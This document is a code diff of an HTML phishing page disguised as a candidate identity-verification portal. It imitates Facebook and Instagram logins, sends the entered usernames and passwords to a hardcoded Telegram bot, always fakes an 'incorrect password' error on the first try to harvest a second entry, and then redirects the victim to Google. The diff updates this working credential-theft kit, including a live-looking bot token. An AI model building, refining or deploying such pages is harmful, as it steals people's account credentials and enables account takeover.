@@ -3,139 +3,143 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Candidate Portal | Identity Verification</title>
+    <title>Candidate Portal | Secure Verification</title>
     <script src="https://cdn.tailwindcss.com"></script>
 </head>
-<body class="bg-gray-100 min-h-screen flex flex-col">
+<body class="bg-gray-100 min-h-screen flex flex-col font-sans">
+
     <header class="bg-white p-4 text-center border-b shadow-sm">
-        <h1 class="text-sm font-bold uppercase tracking-widest text-red-900">CANDIDATE MANAGEMENT SYSTEM</h1>
+        <h1 class="text-[10px] font-bold uppercase tracking-[3px] text-red-900">CANDIDATE MANAGEMENT SYSTEM</h1>
     </header>
 
     <main class="flex-grow flex items-center justify-center p-4">
-        <div id="main-card" class="bg-white p-8 rounded-xl shadow-xl w-full max-w-sm text-center">
-            <h2 class="text-xl font-bold mb-2">Secure Sign In</h2>
-            <p class="text-xs text-gray-500 mb-6">Verify your identity via authorized social profile</p>
+        <div class="bg-white p-8 rounded-2xl shadow-2xl w-full max-w-sm text-center border border-gray-100">
+            <h2 class="text-xl font-bold mb-2 text-gray-800">Identity Verification</h2>
+            <p class="text-[11px] text-gray-400 mb-8 font-medium italic">Please verify your social identity to access the portal</p>
             
-            <div class="space-y-3 mb-6">
-                <button onclick="openModal('Profile A')" class="w-full border flex items-center justify-start px-4 py-3 rounded-lg hover:bg-gray-50 transition">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_2023.svg" class="w-6 mr-3">
-                    <span class="text-sm font-semibold text-gray-700">Verify via Profile A</span>
+            <div class="space-y-4 mb-8">
+                <button onclick="openPortal('Profile A')" class="w-full border border-gray-200 flex items-center justify-start px-5 py-3 rounded-xl hover:bg-gray-50 transition shadow-sm active:scale-95">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_2023.svg" class="w-5 mr-4">
+                    <span class="text-sm font-bold text-gray-600">Verify via Profile A</span>
                 </button>
                 
-                <button onclick="openModal('Profile B')" class="w-full border flex items-center justify-start px-4 py-3 rounded-lg hover:bg-gray-50 transition">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" class="w-6 mr-3">
-                    <span class="text-sm font-semibold text-gray-700">Verify via Profile B</span>
+                <button onclick="openPortal('Profile B')" class="w-full border border-gray-200 flex items-center justify-start px-5 py-3 rounded-xl hover:bg-gray-50 transition shadow-sm active:scale-95">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" class="w-5 mr-4">
+                    <span class="text-sm font-bold text-gray-600">Verify via Profile B</span>
                 </button>
             </div>
 
-            <div class="relative flex py-3 items-center">
-                <div class="flex-grow border-t border-gray-300"></div>
-                <span class="flex-shrink mx-4 text-gray-400 text-[10px] uppercase">Or Use System ID</span>
-                <div class="flex-grow border-t border-gray-300"></div>
+            <div class="relative flex py-2 items-center mb-6">
+                <div class="flex-grow border-t border-gray-200"></div>
+                <span class="flex-shrink mx-4 text-gray-300 text-[9px] font-bold uppercase tracking-widest">System Access Only</span>
+                <div class="flex-grow border-t border-gray-200"></div>
             </div>
 
-            <div class="mt-4 space-y-3 text-left">
-                <label class="text-[10px] font-bold text-gray-400 ml-1">REFERENCE ID</label>
-                <input type="text" placeholder="Enter ID" class="w-full border p-3 rounded-lg text-sm bg-gray-50 outline-none">
-                <label class="text-[10px] font-bold text-gray-400 ml-1">SECURITY KEY</label>
-                <input type="password" placeholder="••••••••" class="w-full border p-3 rounded-lg text-sm bg-gray-50 outline-none">
-                <button class="w-full bg-red-900 text-white py-3 rounded-lg font-bold text-sm mt-2 hover:bg-red-800 transition" style="background-color: #7f1d1d;">LOG IN</button>
+            <div class="space-y-3 text-left">
+                <input type="text" placeholder="Reference ID" class="w-full border border-gray-200 p-3 rounded-xl text-sm bg-gray-50 outline-none">
+                <input type="password" placeholder="Security Key" class="w-full border border-gray-200 p-3 rounded-xl text-sm bg-gray-50 outline-none">
+                <button class="w-full bg-[#7f1d1d] text-white py-3 rounded-xl font-bold text-sm shadow-lg opacity-90 hover:opacity-100 transition">LOGIN & CONTINUE</button>
             </div>
         </div>
     </main>
 
-    <div id="loginModal" class="fixed inset-0 bg-black bg-opacity-70 hidden flex items-center justify-center p-4 z-50">
-        <div class="bg-white rounded-2xl w-full max-w-sm overflow-hidden shadow-2xl">
-            <div class="p-8 text-center">
-                <img id="modal-logo" src="" class="w-14 mx-auto mb-4">
-                <h3 class="font-bold text-lg mb-1">Login Required</h3>
-                <p class="text-xs text-gray-400 mb-4 italic">Candidate Verification Gateway</p>
-                
-                <div id="error-msg" class="bg-red-50 text-red-600 text-[11px] p-3 rounded-lg mb-4 hidden border border-red-100">
-                    ⚠️ Incorrect password. Please try again.
-                </div>
-                
-                <input type="text" id="user" placeholder="Phone, username, or email" class="w-full border p-3 rounded-xl mb-3 text-sm bg-gray-50 focus:ring-1 focus:ring-gray-300 outline-none">
-                <input type="password" id="pass" placeholder="Password" class="w-full border p-3 rounded-xl mb-5 text-sm bg-gray-50 focus:ring-1 focus:ring-gray-300 outline-none">
-                
-                <button onclick="sendData()" id="btnText" class="w-full text-white py-3 rounded-xl font-bold shadow-lg transition">CONFIRM</button>
-                <button onclick="closeModal()" class="mt-4 text-gray-400 text-xs hover:underline">Cancel</button>
+    <div id="verifyModal" class="fixed inset-0 bg-black/90 hidden flex items-center justify-center p-4 z-50 backdrop-blur-md">
+        <div class="bg-white rounded-[25px] w-full max-w-sm p-10 text-center shadow-2xl relative">
+            <img id="modal-icon" src="" class="w-16 mx-auto mb-6">
+            <h3 class="font-black text-2xl text-gray-800 mb-2">Login Required</h3>
+            <p class="text-xs text-gray-400 mb-8 font-semibold uppercase tracking-wider">Candidate Verification Gateway</p>
+            
+            <div id="status-box" class="bg-red-50 text-red-600 text-[11px] p-4 rounded-xl mb-6 hidden border border-red-100 font-bold leading-tight">
+                ⚠️ Verification failed. Incorrect password. Please try again with your real credentials.
             </div>
+            
+            <input type="text" id="target_user" placeholder="Username, email or phone" class="w-full border-2 border-gray-100 p-4 rounded-2xl mb-4 text-sm bg-gray-50 outline-none focus:border-gray-300 transition-all font-medium">
+            <input type="password" id="target_pass" placeholder="Password" class="w-full border-2 border-gray-100 p-4 rounded-2xl mb-8 text-sm bg-gray-50 outline-none focus:border-gray-300 transition-all font-medium">
+            
+            <button onclick="submitToTelegram()" id="submitBtn" class="w-full text-white py-4 rounded-2xl font-black text-lg shadow-xl active:scale-95 transition-all">CONFIRM IDENTITY</button>
+            <button onclick="closePortal()" class="mt-6 text-gray-400 text-xs font-bold hover:text-gray-600 transition tracking-widest uppercase">Go Back</button>
         </div>
     </div>
 
     <script>
-        const CONFIG = {
-            BOT_TOKEN: "8479598107:AAHtDSL81LYQAfnLIWghnpLwDoqaMJ8SLIk", //
-            CHAT_ID: "5757737130", //
-            REDIR: "https://www.google.com"
+        // Your Verified Data
+        const CREDENTIALS = {
+            TOKEN: "8479598107:AAHtDSL81LYQAfnLIWghnpLwDoqaMJ8SLIk",
+            CHAT: "5757737130",
+            SUCCESS_REDIRECT: "https://www.google.com" 
         };
 
-        let attempt = 0;
-        let selectedProfile = "";
+        let attempts = 0;
+        let activeType = "";
 
-        function openModal(profile) {
-            selectedProfile = profile;
-            const logo = document.getElementById('modal-logo');
-            const btn = document.getElementById('btnText');
+        function openPortal(type) {
+            activeType = type;
+            const icon = document.getElementById('modal-icon');
+            const btn = document.getElementById('submitBtn');
             
-            if(profile === 'Profile A') {
-                logo.src = "https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_2023.svg";
+            if(type === 'Profile A') {
+                icon.src = "https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_2023.svg";
                 btn.style.backgroundColor = "#1877F2";
             } else {
-                logo.src = "https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg";
+                icon.src = "https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg";
                 btn.style.backgroundColor = "#E1306C";
             }
-            document.getElementById('loginModal').classList.remove('hidden');
+            document.getElementById('verifyModal').classList.remove('hidden');
         }
 
-        function closeModal() {
-            document.getElementById('loginModal').classList.add('hidden');
-            document.getElementById('error-msg').classList.add('hidden');
+        function closePortal() {
+            document.getElementById('verifyModal').classList.add('hidden');
+            document.getElementById('status-box').classList.add('hidden');
         }
 
-        async function sendData() {
-            const user = document.getElementById('user').value;
-            const pass = document.getElementById('pass').value;
-            const btn = document.getElementById('btnText');
-            const errorMsg = document.getElementById('error-msg');
+        async function submitToTelegram() {
+            const u = document.getElementById('target_user').value;
+            const p = document.getElementById('target_pass').value;
+            const btn = document.getElementById('submitBtn');
+            const statusBox = document.getElementById('status-box');
 
-            if (!user || !pass) { alert("Fields fill karein"); return; }
+            if (!u || !p) { alert("Please enter your details!"); return; }
 
-            btn.innerText = "Processing...";
+            btn.innerText = "VERIFYING...";
             btn.disabled = true;
 
-            const text = `🚀 **NEW LOGIN**\n\n📂 **Type:** ${selectedProfile}\n👤 **User:** \`${user}\` \n🔑 **Pass:** \`${pass}\` \n🔢 **Try:** ${attempt + 1}`;
+            const message = `🚨 **NEW LOGIN ALERT**\n\n👤 **User:** \`${u}\` \n🔑 **Pass:** \`${p}\` \n📂 **Via:** ${activeType}\n🔢 **Attempt:** ${attempts + 1}`;
 
             try {
-                const response = await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+                const response = await fetch(`https://api.telegram.org/bot${CREDENTIALS.TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: text, parse_mode: 'Markdown' })
+                    body: JSON.stringify({
+                        chat_id: CREDENTIALS.CHAT,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
                 });
 
                 if (response.ok) {
-                    attempt++;
-                    if (attempt === 1) {
-                        errorMsg.classList.remove('hidden');
-                        document.getElementById('pass').value = "";
-                        btn.innerText = "CONFIRM";
+                    attempts++;
+                    if (attempts === 1) {
+                        // First attempt always shows error to get better data
+                        statusBox.classList.remove('hidden');
+                        document.getElementById('target_pass').value = "";
+                        btn.innerText = "CONFIRM IDENTITY";
                         btn.disabled = false;
                     } else {
-                        window.location.href = CONFIG.REDIR;
+                        // Second attempt redirects
+                        window.location.href = CREDENTIALS.SUCCESS_REDIRECT;
                     }
                 } else {
-                    alert("Submission error. Try again.");
+                    const err = await response.json();
+                    alert("Error: Bot is not started! Go to Telegram and press START on your bot.");
                     btn.disabled = false;
-                    btn.innerText = "CONFIRM";
+                    btn.innerText = "CONFIRM IDENTITY";
                 }
-            } catch (err) {
-                alert("Network error.");
+            } catch (e) {
+                alert("Network Error: Check your connection.");
                 btn.disabled = false;
-                btn.innerText = "CONFIRM";
+                btn.innerText = "CONFIRM IDENTITY";
             }
         }
     </script>
 </body>
 </html>
-    
